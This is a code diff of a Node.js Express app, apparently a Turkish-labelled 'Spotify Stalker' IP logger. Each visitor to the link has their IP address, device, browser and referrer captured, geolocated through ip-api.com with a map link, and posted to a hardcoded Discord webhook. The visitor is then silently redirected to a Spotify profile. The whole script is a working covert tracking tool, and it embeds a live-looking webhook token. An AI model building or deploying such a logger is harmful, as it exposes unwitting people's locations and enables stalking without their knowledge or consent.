@@ -1,5 +1,8 @@
+const express = require('express');
 const https = require('https');
 
+const app = express();
+const PORT = process.env.PORT || 3000;
 const WEBHOOK = 'https://discord.com/api/webhooks/1513283799583162458/SeJddnVhH8sK1REjZwc9yhTaon0cG7kY85Q8VFhqhfDo2BQstD3-lncKGKoIIuXcYDmO';
 const REDIRECT = 'https://open.spotify.com/user/zx9oehv0zw9qx96qowlby0ktl?si=22be720da7b1485a';
 
@@ -31,11 +34,7 @@ function codeToFlag(code) {
 }
 
 function parseUA(ua) {
-  let os = 'Bilinmiyor';
-  let browser = 'Bilinmiyor';
-  let device = '-';
-  let app = 'Doğrudan / Bilinmiyor';
-
+  let os = 'Bilinmiyor', browser = 'Bilinmiyor', device = '-', app = 'Doğrudan / Bilinmiyor';
   if (/WhatsApp/i.test(ua)) app = 'WhatsApp';
   else if (/Instagram/i.test(ua)) app = 'Instagram';
   else if (/FBAN|FBAV|Facebook/i.test(ua)) app = 'Facebook';
@@ -48,11 +47,9 @@ function parseUA(ua) {
   else if (/TikTok/i.test(ua)) app = 'TikTok';
   else if (/Reddit/i.test(ua)) app = 'Reddit';
   else if (/okhttp/i.test(ua)) app = 'Android Uygulama';
-
   if (/iPhone/i.test(ua)) { device = 'iPhone'; os = 'iOS'; }
   else if (/iPad/i.test(ua)) { device = 'iPad'; os = 'iOS'; }
-  else if (/Android/i.test(ua)) { device = /Mobile/i.test(ua) ? 'Android Telefon' : 'Android Tablet'; }
-
+  else if (/Android/i.test(ua)) device = /Mobile/i.test(ua) ? 'Android Telefon' : 'Android Tablet';
   if (/Windows NT 10/i.test(ua)) os = 'Windows 10';
   else if (/Windows NT 11/i.test(ua)) os = 'Windows 11';
   else if (/Windows NT 6\.3/i.test(ua)) os = 'Windows 8.1';
@@ -60,67 +57,42 @@ function parseUA(ua) {
   else if (/Windows NT 6\.1/i.test(ua)) os = 'Windows 7';
   else if (/Mac OS X (\d+[._]\d+)/.test(ua)) os = 'macOS ' + RegExp.$1.replace('_', '.');
   else if (/Linux/i.test(ua) && !/Android/i.test(ua)) os = 'Linux';
-
-  if (/Chrome/i.test(ua) && !/Edg|OPR/i.test(ua)) {
-    let m = ua.match(/Chrome\/([\d.]+)/);
-    browser = 'Chrome ' + (m ? m[1] : '');
-  } else if (/Firefox/i.test(ua)) {
-    let m = ua.match(/Firefox\/([\d.]+)/);
-    browser = 'Firefox ' + (m ? m[1] : '');
-  } else if (/Edg/i.test(ua)) {
-    let m = ua.match(/Edg\/([\d.]+)/);
-    browser = 'Edge ' + (m ? m[1] : '');
-  } else if (/OPR/i.test(ua)) {
-    let m = ua.match(/OPR\/([\d.]+)/);
-    browser = 'Opera ' + (m ? m[1] : '');
-  } else if (/Safari/i.test(ua)) {
-    let m = ua.match(/Version\/([\d.]+)/);
-    browser = 'Safari ' + (m ? m[1] : '');
-  }
-
+  if (/Chrome/i.test(ua) && !/Edg|OPR/i.test(ua)) { let m = ua.match(/Chrome\/([\d.]+)/); browser = 'Chrome ' + (m ? m[1] : ''); }
+  else if (/Firefox/i.test(ua)) { let m = ua.match(/Firefox\/([\d.]+)/); browser = 'Firefox ' + (m ? m[1] : ''); }
+  else if (/Edg/i.test(ua)) { let m = ua.match(/Edg\/([\d.]+)/); browser = 'Edge ' + (m ? m[1] : ''); }
+  else if (/OPR/i.test(ua)) { let m = ua.match(/OPR\/([\d.]+)/); browser = 'Opera ' + (m ? m[1] : ''); }
+  else if (/Safari/i.test(ua)) { let m = ua.match(/Version\/([\d.]+)/); browser = 'Safari ' + (m ? m[1] : ''); }
   return { os, browser, device, app };
 }
 
 function fmtDate(d) {
-  const day = String(d.getDate()).padStart(2, '0');
-  const month = String(d.getMonth() + 1).padStart(2, '0');
-  const year = d.getFullYear();
-  const h = String(d.getHours()).padStart(2, '0');
-  const m = String(d.getMinutes()).padStart(2, '0');
-  return day + '.' + month + '.' + year + ' ' + h + ':' + m;
+  return String(d.getDate()).padStart(2,'0')+'.'+String(d.getMonth()+1).padStart(2,'0')+'.'+d.getFullYear()+' '+String(d.getHours()).padStart(2,'0')+':'+String(d.getMinutes()).padStart(2,'0');
 }
 
 function relDate(d) {
-  const now = new Date();
-  const diff = now - d;
-  const h = String(d.getHours()).padStart(2, '0');
-  const m = String(d.getMinutes()).padStart(2, '0');
-  if (diff < 86400000 && d.getDate() === now.getDate()) return 'bugün ' + h + ':' + m;
-  const yesterday = new Date(now);
-  yesterday.setDate(yesterday.getDate() - 1);
-  if (d.getDate() === yesterday.getDate() && d.getMonth() === yesterday.getMonth() && d.getFullYear() === yesterday.getFullYear()) return 'dün ' + h + ':' + m;
+  const n = new Date();
+  const h = String(d.getHours()).padStart(2,'0')+':'+String(d.getMinutes()).padStart(2,'0');
+  if (n-d < 86400000 && d.getDate()===n.getDate()) return 'bugün '+h;
+  const y = new Date(n); y.setDate(y.getDate()-1);
+  if (d.getDate()===y.getDate()&&d.getMonth()===y.getMonth()&&d.getFullYear()===y.getFullYear()) return 'dün '+h;
   return fmtDate(d);
 }
 
-module.exports = async (req, res) => {
+app.get('/', async (req, res) => {
   try {
     const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.socket.remoteAddress;
     const uaStr = req.headers['user-agent'] || '';
     const referrer = req.headers['referer'] || '';
-
-    const { os, browser, device, app } = parseUA(uaStr);
-    const source = app !== 'Doğrudan / Bilinmiyor' ? app : (referrer || 'Doğrudan / Bilinmiyor');
-
+    const { os, browser, device, app: detectedApp } = parseUA(uaStr);
+    const source = detectedApp !== 'Doğrudan / Bilinmiyor' ? detectedApp : (referrer || 'Doğrudan / Bilinmiyor');
     let geo = {};
-    try { geo = await fetchJSON('http://ip-api.com/json/' + ip + '?fields=city,country,countryCode,isp,org,lat,lon'); } catch(e) {}
-
+    try { geo = await fetchJSON('http://ip-api.com/json/'+ip+'?fields=city,country,countryCode,isp,org,lat,lon'); } catch(e) {}
     const flag = codeToFlag(geo.countryCode);
-    const konum = geo.city ? geo.city + ', ' + geo.country : 'Bilinmiyor';
-    const mapsLink = geo.lat ? 'https://www.google.com/maps?q=' + geo.lat + ',' + geo.lon : '';
-
+    const konum = geo.city ? geo.city+', '+geo.country : 'Bilinmiyor';
+    const mapsLink = geo.lat ? 'https://www.google.com/maps?q='+geo.lat+','+geo.lon : '';
     const now = new Date();
     const fields = [
-      { name: ':round_pushpin: Konum', value: flag + ' ' + konum + (mapsLink ? '\n[Haritada göster](' + mapsLink + ')' : ''), inline: true },
+      { name: ':round_pushpin: Konum', value: flag+' '+konum+(mapsLink ? '\n[Haritada göster]('+mapsLink+')' : ''), inline: true },
       { name: ':id: IP', value: ip, inline: true },
       { name: ':mobile_phone: Cihaz', value: device, inline: true },
       { name: ':desktop: İşletim Sistemi', value: os, inline: true },
@@ -129,17 +101,9 @@ module.exports = async (req, res) => {
       { name: ':link: Yönlendiren', value: source, inline: true },
       { name: ':alarm_clock: Tarih', value: fmtDate(now), inline: true }
     ];
-
-    await postJSON(WEBHOOK, {
-      embeds: [{
-        title: 'Spotify Stalkeri !!!',
-        color: 0x1DB954,
-        fields: fields,
-        footer: { text: 'Spotify Stalker \u00b7 37xw \u2022 ' + relDate(now) }
-      }]
-    });
+    await postJSON(WEBHOOK, { embeds: [{ title: 'Spotify Stalkeri !!!', color: 0x1DB954, fields, footer: { text: 'Spotify Stalker \u00b7 37xw \u2022 '+relDate(now) } }] });
   } catch(e) {}
+  res.redirect(REDIRECT);
+});
 
-  res.writeHead(302, { Location: REDIRECT });
-  res.end();
-};
+app.listen(PORT, () => console.log('Server running on port '+PORT));
